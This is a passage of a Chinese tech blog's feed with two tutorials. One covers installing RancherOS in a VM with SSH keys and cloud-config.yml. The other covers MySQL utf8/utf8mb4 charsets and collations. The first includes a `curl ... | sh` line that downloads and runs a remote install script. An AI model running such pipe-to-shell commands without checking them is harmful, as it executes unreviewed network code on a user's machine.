    <link href="https://blog.yanzhe.tk/2018/07/15/use-VM-install-RancherOS-for-docker/"/>
    <id>https://blog.yanzhe.tk/2018/07/15/use-VM-install-RancherOS-for-docker/</id>
    <published>2018-07-15T02:37:22.000Z</published>
    <updated>2020-08-23T01:48:10.235Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>docker 有提供windows 下基于VirtualBox/Hyper-V的安装包。<br>已安装VirtualBox的安装Hyper-V版的可能会有问题。</p><p>已安装VM类软件的，并已有黑苹果、Linux环境的，可以直接安装docker。<br><code>curl -sSL https://get.docker.com/ | sh</code> <a href="https://blog.yanzhe.tk/2017/11/09/docker-set-proxy/">之前文章</a>有提到</p><p>如未安装其他系统，可以考虑使用RancherOS。</p><p>下面介绍使用VM安装RancherOS</p><p>这两天帮小伙伴在虚拟机上安装了<a href="https://github.com/rancher/os/releases/latest">RancherOS</a>，一个通过容器构建的简单Linux发行版。只有几十M的系统镜像。<br>在docker上安装docker，挺有意思的。系统内核启动的第一个进程，PID为1的是“System Docker”，它的工作就是初始化系统服务，所有的进程、服务等等都是通过一个个Docker实例来完成的，System Docker类似于其它linux发行版中Systemd比如ArchLinux。</p><h2 id="简要步骤"><a href="#简要步骤" class="headerlink" title="简要步骤"></a>简要步骤</h2><ul><li>测试网络</li><li>更改rancher密码</li><li>配置cloud-config.yml后安装系统到硬盘</li><li>从硬盘启动</li></ul><h2 id="VM安装RancherOS注意点"><a href="#VM安装RancherOS注意点" class="headerlink" title="VM安装RancherOS注意点"></a>VM安装RancherOS注意点</h2><blockquote><ul><li>VM给RancherOS分配的内存最好大于1G，可以分配到2G;</li><li>硬盘可以看使用分配。如需要使用的大，可以分配多点。但不建议低于5G。我和小伙伴们都分配的20G;</li><li>网络模式看自己情况选择，我们使用的桥接模式;</li><li>启动后用户名密码都是rancher;</li><li>现在把RancherOS默认为内存模式启动，需配置cloud-config.yml安装到硬盘，不然会无限重启，或从硬盘找不到系统。</li></ul></blockquote><h2 id="注意主机和VM的连通"><a href="#注意主机和VM的连通" class="headerlink" title="注意主机和VM的连通"></a>注意主机和VM的连通</h2><p>注意主机和VM之间能互相ping通。主要是主机能访问到VM的SSHD服务，默认端口为22。可以使用映射，映射到主机其他端口。</p><p>查看VM的IP地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a | grep inet</span><br></pre></td></tr></table></figure><p><code>wlp3s0</code> 之类的为无线网卡的地址</p><p>在主机和VM互相使用ping命令测试连通。</p><p>测试SSHD服务，可以在主机上使用<code>telnet</code>或<code>putty</code>，<code>git bash</code>中的ssh，或是其他连接工具。</p><h2 id="使用秘钥对"><a href="#使用秘钥对" class="headerlink" title="使用秘钥对"></a>使用秘钥对</h2><p>使用已有的秘钥对，或是重新生成。<br>可以使用<code>puttygen.exe</code>，或是<code>ssh-keygen</code>命令重新生成。</p><h3 id="使用puttygen-exe生成密钥对简要步骤"><a href="#使用puttygen-exe生成密钥对简要步骤" class="headerlink" title="使用puttygen.exe生成密钥对简要步骤"></a>使用puttygen.exe生成密钥对简要步骤</h3><ul><li>运行puttygen.exe</li><li>点击 Generate 按钮生成密钥</li><li>留意下创建的是ssh-2 RSA 和2048bit内容的密钥(使用默认的也都行)</li><li>等待。可在进度条下的软件空白处，移动鼠标，能加快Gen速度</li><li>创建完成后，将显示Public key，可以自行修改Key Comment备注信息</li><li>导出公钥和私钥</li></ul><h3 id="使用ssh-keygen命令生成密钥对"><a href="#使用ssh-keygen命令生成密钥对" class="headerlink" title="使用ssh-keygen命令生成密钥对"></a>使用ssh-keygen命令生成密钥对</h3><p>在window上可以使用<code>Git Bash</code>，然后使用<code>ssh-keygen</code></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b <span class="number">4096</span> -C <span class="string">"your_email@example.com"</span> -f ~/.ssh/id_rsa_rancheros</span><br><span class="line"><span class="comment"># Creates a new ssh key, using the provided email as a label</span></span><br><span class="line"><span class="comment"># Generating public/private rsa key pair.</span></span><br><span class="line">Enter <span class="built_in">file</span> <span class="keyword">in</span> which <span class="built_in">to</span> save <span class="keyword">the</span> key (/Users/you/.ssh/id_rsa): [Press enter] <span class="comment"> // 推荐使用默认地址</span></span><br><span class="line">Enter passphrase (<span class="literal">empty</span> <span class="keyword">for</span> no passphrase):  <span class="comment"> //此处点击 Enter 键即可，也可以填写密码，填写密码后每次使用 SSH 方式推送代码时都会要求输入密码，由于这个 Key 也不是用于军事目的，所以也无需设置密码。</span></span><br></pre></td></tr></table></figure><p>成功将显示<br>Your identification has been saved in /Users/you/.ssh/id_rsa.<br>Your public key has been saved in /Users/you/.ssh/id_rsa.pub.</p><p><strong>注意替换[<a href="mailto:your_email@example.com">your_email@example.com</a>]为自己的邮箱</strong></p><ul><li>-C　不使用，默认使用 当前用户名@主机名 的形式</li><li>-f　不指定，默认使用~/.ssh/id_rsa<pre><code>当然，也可以在提问保存地址时自行更改</code></pre></li></ul><h3 id="使用puttygen-exe生成ppk格式私钥"><a href="#使用puttygen-exe生成ppk格式私钥" class="headerlink" title="使用puttygen.exe生成ppk格式私钥"></a>使用puttygen.exe生成ppk格式私钥</h3><p>现在挺多软件基于putty的ppk格式密钥。所以如果是使用的<code>ssh-keygen</code>生成的密钥对，可以在<code>puttygen.exe</code>中导入生成的私钥，生成ppk格式私钥。</p><ul><li>运行puttygen.exe</li><li>点击Conversions菜单项中的Import key</li><li>选择生成的id_rsa文件</li><li>在puttygen.exe的界面上点击Save private key按钮就可以把私钥转换为ppk的格式了</li></ul><h2 id="使用命令行方式登录，可以配置config"><a href="#使用命令行方式登录，可以配置config" class="headerlink" title="使用命令行方式登录，可以配置config"></a>使用命令行方式登录，可以配置config</h2><p>在~/.ssh文件夹下，打开/创建 config 文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rancheros</span></span><br><span class="line">Host rancheros</span><br><span class="line">    HostName 192.168.23.178</span><br><span class="line">   <span class="built_in"> Port </span>22</span><br><span class="line">   <span class="built_in"> User </span>rancher</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">    IdentityFile  ~/.ssh/id_rsa_rancheros</span><br><span class="line">    IdentitiesOnly <span class="literal">yes</span></span><br></pre></td></tr></table></figure><p>HostName需替换为虚拟机IP地址<br>端口如映射为主机其他端口，也需更改，同时IP使用主机IP</p><h2 id="配置cloud-config-yml"><a href="#配置cloud-config-yml" class="headerlink" title="配置cloud-config.yml"></a>配置cloud-config.yml</h2><p>cloud-config.yml文件 <a href="cloud-config">自用</a>,改后缀为yml，即改文件名为<code>cloud-config.yml</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cloud-config</span><br><span class="line"></span><br><span class="line">rancher:</span><br><span class="line">  docker:</span><br><span class="line">    registry_mirror: https:<span class="comment">//registry.docker-cn.com</span></span><br><span class="line">  network:</span><br><span class="line">    #<span class="built_in">int</span>erfaces:</span><br><span class="line">    #    eth0:</span><br><span class="line">    #        address: <span class="number">192.168</span><span class="number">.1</span><span class="number">.188</span>/<span class="number">24</span></span><br><span class="line">    #        gateway: <span class="number">192.168</span><span class="number">.1</span><span class="number">.254</span></span><br><span class="line">    #        mtu: <span class="number">1500</span></span><br><span class="line">    #        dhcp: <span class="literal">false</span></span><br><span class="line">    dns:</span><br><span class="line">      nameservers:</span><br><span class="line">       - <span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span></span><br><span class="line">       - <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">ssh_authorized_keys:</span><br><span class="line">  - ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDNdwM2gpzBg71pwcylJEE65QsHWGoX5UASAbgNvR8pirUJbVhBENlTwyROgKPPGPtbcyuVAH2bIu3j3HtDxWBG1+fL2cMegd/<span class="number">4</span>X79emClufSBuquFH0ZgyRkUtxwVZxtLWkNi+U3GYPbvwXWZxmKQ63lmfD4/FH0ymkEteI0BPaQD5eq3gm0iRbZ/I/<span class="number">0543</span>iSn1LULVNTsdAzu34OO89VbCS4eGs3OVLZGvitQE7SECuoavze/GiuNp9DMxu8qnOxOaRv7tp0zi4fSLTXUpPRixqwaXlmpNXawEHzPRz1tqf2dtBWgKy2HLKqDbU6+vpE2oDmwTsxGw0rL4H9iELMovovDrDWoVR8ZFFNMjW++MLcRw0S9YWzu3Urp1wghRVgQC436HQduzBLFl7eqn7KNK08i1X56IUM88vuUdQON8QBwhhudXFef3AeAYDK8lf9kApetx2Xh4czHNSFauQgNPfmLaiKzLv8BBWhjLNo/<span class="number">1</span>I1HY400DAS/sZFXVJKEB/YnwbbgYah42cpS8AN2VgFmbq5UyOA/z8VkW0eBaVVia9XhgQDeLCyw/zsVJy09qwj7D9SkRy1OwoPPqKulAcbTfDw8Ayrw5kTmKF2oFUcv9hQXK1aAVOI1IGE5DJZql5nfuRcW097qCk+<span class="number">7</span>D2UWNKQm5ORKTzl0jYvQe9ajW7OZjw== <span class="symbol">rancher@</span>rancher</span><br><span class="line"># - ssh-rsa BBB...ZZZ <span class="symbol">example2@</span>rancher</span><br></pre></td></tr></table></figure><blockquote><ul><li>注意将<code>https://99nkhzdo.mirror.aliyuncs.com</code> 替换为自己的阿里云Docker镜像地址。</li><li>注意使用之前生成的公钥id_rsa_rancheros.pub中的内容替换BBB…ZZZ example2@rancher，同时去除#注释</li><li>如不能自动获取IP地址，将network下的#去除，同时，配置自己的address,gateway，与主机在同一网关</li><li>cloud-config.yml文件格式。注意文件缩进使用空格键，不要使用TAB键。</li><li>注意Linux文件换行。</li></ul></blockquote><h2 id="必须更改rancher密码"><a href="#必须更改rancher密码" class="headerlink" title="必须更改rancher密码"></a>必须更改rancher密码</h2><p>VM中使用更改rancher账户密码<br>注意启动之后默认的账号密码为rancher:rancher</p><p>默认密码可能不能使用SSH访问，必须进行一次修改密码，密码可仍使用rancher</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo passwd rancher</span></span><br></pre></td></tr></table></figure><p>输入密码rancher，确认密码rancher</p><p>切换到root用户</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -i</span></span><br></pre></td></tr></table></figure><h2 id="使用SFTP工具上传cloud-config-yml"><a href="#使用SFTP工具上传cloud-config-yml" class="headerlink" title="使用SFTP工具上传cloud-config.yml"></a>使用SFTP工具上传cloud-config.yml</h2><p>可以直接在VM中进行修改。<br>如在主机上进行修改，则需使用SFTP工具上传cloud-config.yml文件。</p><p>如使用PSFTP.EXE</p><ul><li>将cloud-config.yml拷入PSFTP.EXE同级目录</li><li>open 192.168.1.172 　连接上VMIP</li><li>put cloud-config.yml</li></ul><h2 id="安装RancherOS到硬盘，从硬盘启动"><a href="#安装RancherOS到硬盘，从硬盘启动" class="headerlink" title="安装RancherOS到硬盘，从硬盘启动"></a>安装RancherOS到硬盘，从硬盘启动</h2><p>如已调整启动顺序，优先从硬盘启动，是否重启选y，将自动重启。<br>未有调整，关机后，移除光驱，选择从硬盘启动，开机。然后使用ssh登录/或其他工具Putty、MobaXterm、XShell等登录。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo ros<span class="built_in"> config </span>validate -i cloud-config.yml </span><br><span class="line"><span class="comment">#验证cloud-config.yml文件是否正确</span></span><br><span class="line">sudo ros install -c cloud-config.yml -d /dev/sda</span><br><span class="line"></span><br><span class="line"><span class="comment">#提示是否继续，确认y</span></span><br><span class="line">y</span><br><span class="line"></span><br><span class="line"><span class="comment">#成功之后提示是否重启，不重启N</span></span><br><span class="line">N</span><br><span class="line"><span class="comment">#然后关机</span></span><br><span class="line">sudo poweroff</span><br></pre></td></tr></table></figure><p>一般为<code>/dev/sda</code>，如不对，可以使用以下命令自行查看本地磁盘</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fdisk -l <span class="string">| grep Disk</span></span><br></pre></td></tr></table></figure><h2 id="查看ros配置"><a href="#查看ros配置" class="headerlink" title="查看ros配置"></a>查看ros配置</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ros<span class="built_in"> config </span>export</span><br></pre></td></tr></table></figure><h2 id="rancheros重启docker"><a href="#rancheros重启docker" class="headerlink" title="rancheros重启docker"></a>rancheros重启docker</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">system</span>-docker <span class="built_in">restart</span> docker</span><br><span class="line">#或是</span><br><span class="line">sudo ros s <span class="built_in">restart</span> docker</span><br></pre></td></tr></table></figure><h2 id="补充-Putty配置ppk登录"><a href="#补充-Putty配置ppk登录" class="headerlink" title="补充:Putty配置ppk登录"></a>补充:Putty配置ppk登录</h2><ul><li>在putty中选中id_rsa_rancheros</li><li>一般放在C:\Users&lt;用户名&gt;.ssh</li><li>然后在session中登入</li></ul><p><img data-src="putty_config_ppk.png" alt="putty配置ppk"></p><p>其他界面工具类似，配置私钥/ppk格式私钥</p>]]></content>
    
    <summary type="html">
    
      在VM中安装只有几十M镜像文件的基于Docker构建的简单Linux发行版RancherOS。测试网络是否连通，更改rancher密码，配置cloud-config.yml后安装系统到硬盘。然后从硬盘启动。
    
    </summary>
    
    
      <category term="Docker" scheme="https://blog.yanzhe.tk/categories/docker/"/>
    
    
      <category term="Docker" scheme="https://blog.yanzhe.tk/tags/docker/"/>
    
      <category term="RancherOS" scheme="https://blog.yanzhe.tk/tags/rancheros/"/>
    
      <category term="ssh-keygen" scheme="https://blog.yanzhe.tk/tags/ssh-keygen/"/>
    
      <category term="ssh配置config简化命令行登录" scheme="https://blog.yanzhe.tk/tags/ssh%E9%85%8D%E7%BD%AEconfig%E7%AE%80%E5%8C%96%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%99%BB%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>MySQL中utf8和utf8mb4的使用以及字符集相关</title>
    <link href="https://blog.yanzhe.tk/2018/06/28/mysql-utf8-and-utf8mb4/"/>
    <id>https://blog.yanzhe.tk/2018/06/28/mysql-utf8-and-utf8mb4/</id>
    <published>2018-06-28T01:22:49.000Z</published>
    <updated>2020-08-23T01:48:10.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>以前一般在MySQL开发了，就实际上转向Oracle了，没留意一些东西，碰到了就回头过来看看。<br>有小伙伴在安装MySQL后设置编码为utf8，我们以前都是会直接设置utf8mb4，这背后又隐藏着什么？这一切的背后，究竟是人性的扭曲还是道德的沦丧？</p><p>其实只是因为<code>Unicode 委员会还做着 “65535 个字符足够全世界用了”的美梦。</code> <a href="https://my.oschina.net/xsh1208/blog/1052781">参考</a> 我比较喜欢这句。<br>也就是指的Unicode最初的<a href="https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%B9%B3%E9%9D%A2%E6%98%A0%E5%B0%84">基本多文本平面</a> (BMP)（U+0000至U+FFFF），BMP 已经包含了控制符、拉丁文，中、日、韩等绝大多数国际字符，但并不是所有，最常见的就算现在手机端常用的表情字符Emoji（Emoji 是一种特殊的 Unicode 编码，常见于 ios 和 android 手机上）一些不常用的汉字，如 “墅” ，这些需要四个字节才能编码出来。后来的补充字符(U+10000至U+10FFFF)，则将Unicode扩充到了(U+0000至U+10FFFF)。</p><blockquote><p>注：QQ里面的内置的表情不算，它是通过特殊映射到的一个gif图片。一般输入法自带的就是。</p></blockquote><p>MySQL在<strong>5.5.3</strong>之后(查看版本：select version();)增加了这个<code>utf8mb4</code>的编码，mb4就是<strong>most bytes 4</strong>的意思，支持的字节数最大为4，即专门用来兼容四字节的unicode。<br>而我们通常在MySQL中所说的<code>utf8</code>编码，其实就是指的 <strong>utf8mb3</strong> 。utf8mb4 是 utf8mb3 的超集并完全兼容utf8mb3，能够用四个字节存储更多的字符。</p><blockquote><p>utf8mb3：Unicode字符集的UTF-8编码，每个字符使用1到3个字节。<br>utf8mb4：Unicode字符集的UTF-8编码，每个字符使用1到4个字节。</p></blockquote><p>对于 CHAR 类型数据，utf8mb4 会多消耗一些空间，根据 Mysql 官方建议， <strong>使用 VARCHAR 替代 CHAR</strong> 以有效节省空间。</p><p>当你的数据库里要求能够存入这些表情或宽字符时，可以把字段定义为 <code>utf8mb4</code>，同时要注意连接字符集也要设置为<code>utf8mb4</code>，否则在 <a href="http://seanlook.com/2016/04/22/mysql-sql-mode-troubleshooting/">严格模式</a> 下会出现 <code>Incorrect string value: /xF0/xA1/x8B/xBE/xE5/xA2… for column &#39;name&#39;</code> 这样的错误，非严格模式下此后的数据会被截断。</p><p>建立数据库/表和进行数据库操作时尽量显式指出使用的字符集，而不是依赖于MySQL的默认设置，否则MySQL升级时可能带来很大困扰。</p><p><strong>如默认不区分大小写，可添加binary，强制进行按字节进行比较,以区分大小写。</strong> <code>如建表时未添加binary属性，可能影响索引失效</code> <a href="#binary相关">其他binary相关</a></p><p><strong>MySQL使用的UTF-8都没有BOM值。</strong><br><code>BOM(Byte Order Mark)，即文本开头为不可见的3个字节，EF BB BF</code></p><h1 id="utf8升级utf8mb4"><a href="#utf8升级utf8mb4" class="headerlink" title="utf8升级utf8mb4"></a><a href="#修改为utf8mb4示例">utf8升级utf8mb4</a></h1><p>如果你的表定义和连接字符集都是utf8，那么直接在你的表上执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tbl_name <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8mb4;</span><br></pre></td></tr></table></figure><p>则能够该表上所有的列的character类型变成 utf8mb4，表定义的默认字符集也会修改。</p><p>点击上面目录见修改数据库、表、字段实例，或<a href="#修改为utf8mb4示例">点这实例</a> 。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>使用utf8mb4之后，官方建议尽量用 varchar 代替 char。</li><li><code>SET NAMES utf8mb4;</code> 让连接的时候便可以插入四字节字符。（如果依然使用 utf8 连接，只要不出现四字节字符则完全没问题）。</li><li><code>SET character-set-server = utf8mb4;</code> 修改服务端 <code>character-set-server=utf8mb4</code>，Java驱动会自动检测服务端 <code>character_set_server</code> 的配置，如果为utf8mb4，驱动在建立连接的时候设置 <code>SET NAMES utf8mb4</code>。</li><li><code>SET character-set = utf8mb4;</code> 修改服务端c++, php, python 等语言的设置。</li><li>不能ONLINE，也就是执行之后全表禁止修改，有关这方面的讨论见 [mysql 5.6 原生Online DDL解析](<a href="http://seanlook.com/2016/05/24/mysql-online-ddl-">http://seanlook.com/2016/05/24/mysql-online-ddl-</a> concept/)；</li><li>它可能会自动该表字段类型定义，如 <a href="https://dev.mysql.com/doc/refman/8.0/en/alter-table.html">VARCHAR 被转成 MEDIUMTEXT</a>，可以通过 MODIFY 指定类型为原类型</li><li>不要随便执行<code>ALTER TABLE tbl_name DEFAULT CHARACTER SET utf8mb4</code>， <strong>特别是当表原本不是utf8时，除非表是空的或者你确认表里只有拉丁字符</strong> ，否则正常和乱的就混在一起了。</li><li><strong>最重要的是</strong> ，你连接时使用的latin1字符集写入了历史数据，表定义是latin1或utf8，不要期望通过 <code>ALTER ... CONVERT ...</code> 能够让你达到用utf8读取历史中文数据的目的，没卵用，老老实实做逻辑dump。</li><li>索引键超长问题。<code>Error 1071: Specified key was too long; max key length is 767 bytes</code>。当使用utf8mb4编码后，主键id的长度设置255，太长，只能设置小于191的。<a herf="#索引键超长">详解</a></li><li>join 查询时索引失效问题。索引失效发生在utf8mb4列 在条件左边。</li></ul><p><a href="http://seanlook.com/2016/10/23/mysql-utf8mb4/">摘自</a></p><p><a href="#SET NAMES utf8mb4 实际等同于SET"><code>SET NAMES utf8mb4;</code>实际等同于</a><br><a href="#MySQL字符集系统变量名简述">MySQL字符集系统变量名简述</a></p><p>其他</p><ul><li>my.cnf中的default_character_set设置只影响mysql命令连接服务器时的连接字符集，不会对使用libmysqlclient库的应用程序产生任何作用！</li><li>对字段进行的SQL函数操作通常都是以内部操作字符集进行的，不受连接字符集设置的影响。</li><li>SQL语句中的裸字符串会受到连接字符集或introducer设置的影响，对于比较之类的操作可能产生完全不同的结果，需要小心！</li></ul><h1 id="命令详解"><a href="#命令详解" class="headerlink" title="命令详解"></a>命令详解</h1><h2 id="列出可用的字符集"><a href="#列出可用的字符集" class="headerlink" title="列出可用的字符集"></a>列出可用的字符集</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span>;</span><br></pre></td></tr></table></figure><p>或是查询<code>INFORMATION_SCHEMA CHARACTER_SETS表</code></p><p>列出常见字符集</p><table><thead><tr><th>Charset</th><th>Description</th><th>Default collation</th><th>Maxlen</th></tr></thead><tbody><tr><td>gb18030</td><td></td><td>gb18030_chinese_ci</td><td>4</td></tr><tr><td>gb2312</td><td></td><td>gb2312_chinese_ci</td><td>2</td></tr><tr><td>gbk</td><td></td><td>gbk_chinese_ci</td><td>2</td></tr><tr><td>utf16</td><td>UTF-16 Unicode</td><td>utf16_general_ci</td><td>4</td></tr><tr><td>utf16le</td><td>UTF-16LE Unicode</td><td>utf16le_general_ci</td><td>4</td></tr><tr><td>utf32</td><td>UTF-32 Unicode</td><td>utf32_general_ci</td><td>4</td></tr><tr><td>utf8</td><td></td><td>utf8_general_ci</td><td>3</td></tr><tr><td>utf8mb4</td><td>UTF-8 Unicode</td><td>utf8mb4_0900_ai_ci</td><td>4</td></tr></tbody></table><p>是的，没写错，utf8已经不好意思在描述里自称<code>UTF-8 Unicode</code>了</p><h2 id="列出字符集的排序规则-校对集-以及规则解释"><a href="#列出字符集的排序规则-校对集-以及规则解释" class="headerlink" title="列出字符集的排序规则(校对集)以及规则解释"></a>列出字符集的排序规则(校对集)以及规则解释</h2><p>给定的字符集总是至少有一个排序规则，并且大多数字符集都有几个排序规则。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">COLLATION</span> <span class="keyword">WHERE</span> <span class="keyword">Charset</span> = <span class="string">'utf8mb4'</span>;</span><br></pre></td></tr></table></figure><p>或查询<code>INFORMATION_SCHEMA COLLATIONS表</code></p><p>utf8 的默认排序规则为<code>utf8_general_ci</code></p><p>列出<code>utf8mb4</code>的常见排序规则，默认为<code>utf8mb4_0900_ai_ci</code> ，即是UCA 9.0.0版本的Unicode，口音不敏感，不区分大小写 。</p><table><thead><tr><th>Collation</th><th>Charset</th><th>Id</th><th>Default</th><th>Compiled</th><th>Sortlen</th><th>Pad_attribute</th></tr></thead><tbody><tr><td>utf8mb4_0900_ai_ci</td><td>utf8mb4</td><td>255</td><td>Yes</td><td>Yes</td><td>0</td><td>NO PAD</td></tr><tr><td>utf8mb4_general_ci</td><td>utf8mb4</td><td>45</td><td></td><td>Yes</td><td>1</td><td>PAD SPACE</td></tr><tr><td>utf8mb4_unicode_520_ci</td><td>utf8mb4</td><td>246</td><td></td><td>Yes</td><td>8</td><td>PAD SPACE</td></tr><tr><td>utf8mb4_unicode_ci</td><td>utf8mb4</td><td>224</td><td></td><td>Yes</td><td>8</td><td>PAD SPACE</td></tr></tbody></table><h3 id="Pad-attribute-MySQL比较字符串时尾部空格是否忽略"><a href="#Pad-attribute-MySQL比较字符串时尾部空格是否忽略" class="headerlink" title="Pad_attribute:MySQL比较字符串时尾部空格是否忽略"></a>Pad_attribute:MySQL比较字符串时尾部空格是否忽略</h3><p><code>NO PAD</code> 排序规则将字符串末尾的空格处理为任何其他字符。<br><code>PAD SPACE</code>排序，尾部空格在比较中无关紧要; 比较字符串而不考虑任何尾随空格。</p><p>即是<code>PAD SPACE</code>会出现以下情况，MySQL比较字符串时会忽略尾部空格。包括其他推荐的<code>utf8mb4_unicode_ci</code>和<code>utf8mb4_general_ci</code>以及所有utf8,，这算是一个小坑，注意不要跳进来了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#39;a &#39; &#x3D; &#39;a&#39;;</span><br><span class="line">+------------+</span><br><span class="line">| &#39;a &#39; &#x3D; &#39;a&#39; |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p>所以，<strong>使用<code>utf8mb4_unicode_ci</code>和<code>utf8mb4_general_ci</code>时，一定要做好去空格trim操作。</strong></p><p><code>utf8mb4_general_ci</code> 在比较和排序的时候更快。<br><code>utf8mb4_unicode_ci</code> 是基于标准的Unicode来排序和比较，能够在各种语言之间精确排序。比如Unicode把<code>ß</code>、<code>Œ</code>当成<code>ss</code>和<code>OE</code>来看；而general会把它们当成<code>s</code>、<code>e</code>，再如<code>ÀÁÅåāă</code>各自都与 <code>A</code> 相等。</p><h3 id="MySQL字符串比较时，-ci不区分，-cs-bin区分大小写"><a href="#MySQL字符串比较时，-ci不区分，-cs-bin区分大小写" class="headerlink" title="MySQL字符串比较时，_ci不区分，_cs/_bin区分大小写"></a>MySQL字符串比较时，_ci不区分，_cs/_bin区分大小写</h3><p>安装时如果文件系统区分，如Linux，则<code>lower_case_table_names</code>参数为0，即区分大小写。<br>如果文件系统不区分，如Windows或MacOS上，即不区分大小写。<br>在Windows上，默认值为1.在macOS上，默认值为2。</p><table><thead><tr><th>OS</th><th>lower_case_table_names</th><th>是否区分大小写</th><th>存储数据库、表、表别名</th></tr></thead><tbody><tr><td>Linux、Unix</td><td>0</td><td>区分大小写</td><td>表名将按指定存储</td></tr><tr><td>Windows</td><td>1</td><td>不区分大小写</td><td>表名将以小写形式存储在磁盘上</td></tr><tr><td>MacOS</td><td>2</td><td>不区分大小写</td><td>表名按照给定值存储，但以小写形式比较</td></tr></tbody></table><p><strong>MyISAM 引擎不支持–lower_case_table_names=0在不区分大小写的文件系统上启动服务器</strong><br><strong>InnoDB 引擎，则应在所有平台上将此变量设置为1以强制名称转换为小写字母。</strong></p><table><thead><tr><th>后缀</th><th>含义</th></tr></thead><tbody><tr><td>_ai</td><td>口音不敏感</td></tr><tr><td>_as</td><td>口音敏感</td></tr><tr><td>_ci</td><td>不区分大小写</td></tr><tr><td>_cs</td><td>区分大小写</td></tr><tr><td>_ks</td><td>假名敏感</td></tr><tr><td>_bin</td><td>二进制,区分大小写</td></tr></tbody></table><h3 id="Unicode排序算法-UCA-版本"><a href="#Unicode排序算法-UCA-版本" class="headerlink" title="Unicode排序算法(UCA)版本"></a>Unicode排序算法(UCA)版本</h3><p>对于Unicode字符集，排序规则名称可能包含一个版本号，以指示排序规则基于的Unicode排序算法（UCA）的版本。</p><ul><li><p>utf8mb4_0900_ai_ci基于<a href="http://www.unicode.org/Public/UCA/9.0.0/allkeys.txt">UCA 9.0.0</a>。</p></li><li><p>utf8mb4_unicode_520_ci基于<a href="http://www.unicode.org/Public/UCA/5.2.0/allkeys.txt">UCA 5.2.0</a>。</p></li><li><p>utf8mb4_unicode_ci（没有版本命名）基于<a href="http://www.unicode.org/Public/UCA/4.0.0/allkeys-4.0.0.txt">UCA 4.0.0</a>。</p></li></ul><h2 id="INFORMATION-SCHEMA-中的大小写敏感"><a href="#INFORMATION-SCHEMA-中的大小写敏感" class="headerlink" title="INFORMATION_SCHEMA 中的大小写敏感"></a>INFORMATION_SCHEMA 中的大小写敏感</h2><p>INFORMATION_SCHEMA表格中的 字符串列具有utf8_general_ci大小写不敏感的排序规则。当前在Linux上，<code>lower_case_table_names</code>为0，即区分大小写。<br>查询在SCHEMATA.SCHEMA_NAME列中 搜索 mysql数据库，和MYSQL 数据库，结果将不同。</p><p>想使用MYSQL查询出mysql</p><ol><li>查询时COLLATE指定排序规则</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 